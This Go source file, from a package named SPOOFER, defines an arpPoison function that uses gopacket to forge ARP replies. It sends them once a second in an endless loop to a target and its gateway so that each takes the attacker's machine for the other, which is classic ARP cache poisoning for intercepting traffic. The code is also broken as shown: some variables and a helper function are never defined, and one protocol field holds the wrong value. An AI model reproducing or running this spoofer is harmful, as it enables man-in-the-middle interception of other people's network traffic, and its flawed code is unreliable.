package SPOOFER

import (
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket/layers"
)

// gw = gateway
// arp = you already know what that means dummie

func arpPoison(targetMAC, gateway, gatewayMAC string) {
	gw := (net.ParseIP(gateway))
	tg := (net.ParseIP(target))
	tgm, _ := net.ParseMAC(targetMAC)
	gwm, _ := net.ParseMAC(gatewayMAC)
	ethernetPacket := layers.Ethernet{}
	ethernetPacket.DstMAC = tgm
	ethernetPacket.SrcMAC = macAddr
	ethernetPacket.EthernetType = layers.EthernetTypeARP
	arpPacket := layers.ARP{}
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.Protocol = 0x0806
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2
	arpPacket.SourceHwAddress = macAddr
	arpPacket.SourceProtAddress = gw
	arpPacket.DstHwAddress = tgm
	arpPacket.DstProtAddress = tg
	gwEthernetPacket := ethernetPacket
	gwARPPacket := arpPacket
	gwARPPacket.SourceProtAddress = tg
	gwARPPacket.DstHwAddress = gwm
	gwARPPacket.DstProtAddress = gw
	counter := 0
	for {
		counter += 1
		writePoison(arpPacket, ethernetPacket)
		fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Writer -> \033[38;5;43m Sent and wrote the arp packet")
		writePoison(gwARPPacket, gwEthernetPacket)
		fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Writer -> \033[38;5;43m Sent and wrote the gateway packet")
		time.Sleep(1 * time.Second)
	}

}
